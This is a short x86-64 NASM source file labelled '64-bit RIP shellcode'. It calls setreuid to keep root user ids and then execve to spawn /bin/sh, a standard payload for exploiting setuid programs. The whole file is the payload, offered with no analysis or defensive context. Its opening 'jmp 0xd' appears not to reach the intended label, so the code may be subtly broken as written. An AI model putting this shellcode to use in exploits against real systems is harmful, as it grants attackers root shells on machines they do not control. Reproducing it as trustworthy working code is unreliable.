BITS 64
 
;
; 64-bit RIP shellcode
;
 
GLOBAL _start
 
SECTION .data
_start:
    jmp 0xd
 
shell:
    db '/bin/shN'
 
run:
    ; setreuid(ruid, euid)
    xor rax, rax
    add ax, 113            ; 113 = setreuid
    xor rdi, rdi            ; real userid
    xor rsi, rsi            ; effective userid
    syscall
 
    ; execve(char *filename, char *argv[], char *envp[]);
    xor rax, rax
    add ax, 59             ; 59 = execve
    lea rdi, [rel shell]    ; get string address
    mov [rdi+7], byte ah    ; put a null byte after /bin/sh (replace N)
    xor rsi, rsi            ; char *argv[] = null
    xor rdx, rdx            ; char *envp[] = null
    syscall
